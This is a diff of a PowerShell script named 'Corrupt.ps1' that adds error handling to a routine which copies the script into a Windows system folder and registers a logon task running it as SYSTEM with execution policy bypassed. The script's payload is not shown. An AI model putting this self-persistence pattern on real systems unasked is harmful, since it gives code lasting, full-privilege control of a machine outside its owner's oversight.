@@ -1,7 +1,7 @@
 # Corrupt.ps1 by Gorstak
 
 # Ensure the script isn't running multiple times
-$currentScript = $MyInvocation.MyCommand.Path
+$currentScript = $PSCommandPath
 $existingProcess = Get-Process | Where-Object {
     $_.Path -eq $currentScript -and $_.Id -ne $PID
 }
@@ -34,7 +34,11 @@ function Register-SystemLogonScript {
     )
 
     # Define paths
-    $scriptSource = $MyInvocation.MyCommand.Path
+    $scriptSource = $PSCommandPath
+    if (-not $scriptSource) {
+        Write-Output "Error: Could not determine script path. Ensure the script is run from a file."
+        exit 1
+    }
     $targetFolder = "C:\Windows\Setup\Scripts\Bin"
     $targetPath = Join-Path $targetFolder (Split-Path $scriptSource -Leaf)
 
@@ -45,8 +49,13 @@ function Register-SystemLogonScript {
     }
 
     # Copy the script
-    Copy-Item -Path $scriptSource -Destination $targetPath -Force
-    Write-Output "Copied script to: $targetPath"
+    try {
+        Copy-Item -Path $scriptSource -Destination $targetPath -Force -ErrorAction Stop
+        Write-Output "Copied script to: $targetPath"
+    } catch {
+        Write-Output "Failed to copy script to ${targetPath}: $_"
+        exit 1
+    }
 
     # Define the scheduled task action and trigger
     $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"$targetPath`""
@@ -60,6 +69,7 @@ function Register-SystemLogonScript {
         Write-Output "Scheduled task '$TaskName' created to run at user logon under SYSTEM."
     } catch {
         Write-Output "Failed to register task: $_"
+        exit 1
     }
 }
 
